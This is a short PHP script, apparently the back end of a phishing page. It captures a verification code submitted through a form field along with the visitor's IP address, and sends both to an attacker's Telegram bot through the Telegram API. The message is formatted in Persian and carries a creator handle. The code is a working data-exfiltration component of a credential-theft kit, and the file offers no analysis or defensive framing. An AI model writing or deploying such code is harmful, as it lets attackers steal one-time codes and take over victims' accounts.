<?php
include("0098.php");
$ip = $_SERVER['REMOTE_ADDR'];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $phoneNumber = $_POST['code'];
  $message = "
  ✅ کد تایید وارد شد ✅
  
🌐  آیپی : $ip
  
🤖 کد تایید : <code>$phoneNumber</code>
  
  <b>CR : @amiirhsen0098</b>";

  $url = "https://api.telegram.org/bot$botToken/sendMessage?parse_mode=HTML&chat_id=$chatId&text=" . urlencode($message);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
}
